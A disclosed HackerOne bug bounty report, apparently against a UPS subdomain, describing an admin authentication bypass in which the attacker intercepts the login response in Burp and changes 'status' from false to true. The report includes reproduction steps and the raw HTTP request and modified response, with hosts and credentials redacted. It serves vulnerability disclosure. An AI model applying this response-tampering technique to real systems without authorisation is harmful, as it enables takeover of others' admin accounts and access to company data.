# Admin Authentication Bypass Lead to Admin Account Takeover 

## Report Details
- **Report ID**: 1490470
- **URL**: https://hackerone.com/reports/1490470
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-02-24T04:34:21.010Z
- **Disclosed**: 2022-06-20T00:18:15.085Z

## Reporter
- **Username**: 7odamoo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ups

## Vulnerability Information
Hello Team

I found that i can bypass the login page of the Admin account by intercepting the respone of the login request of ```█████``` subdomain and change ```status``` from ```false``` to ```true```

## Steps To Reproduce:

  1. Open ```████```
  2. Enter ```Admin``` as a Username  and ```███``` as a password 

█████

  3. Press log in and Intercept the request in Burp
```
POST /api/Account/Login/ HTTP/2
Host: ███████
Cookie: ███
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 38
Origin: ████████
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"UserName":"██████","Password":"██████████"}
```

  4. Intercept the response for this request in Burp by >> ```Do Intercept >>Response to this request``` and then Forward this request
  5. Change ```status``` value from ```false``` to ```true``` and Forward the request

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='███-Allow-Origin: ██████-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: ████ ██████ GMT
Content-Length: 71

{"status":true,"errorMessage":"Username and Password does not match."}
```


  6. Now open ```Report``` , ```Change Password``` and  ```Process Return``` and then Turn off the intercept of the Burp

██████████
█████████
███████

## Supporting Material/References:

POC Video

█████████

## Impact

The attacker can 
- login as an ██████ by bypassing the authentication  
- change the ███ password to takeove the ███ account
- View the company's reports and delete them [1066 Report]
- View processReturn

## Attachments
No attachments
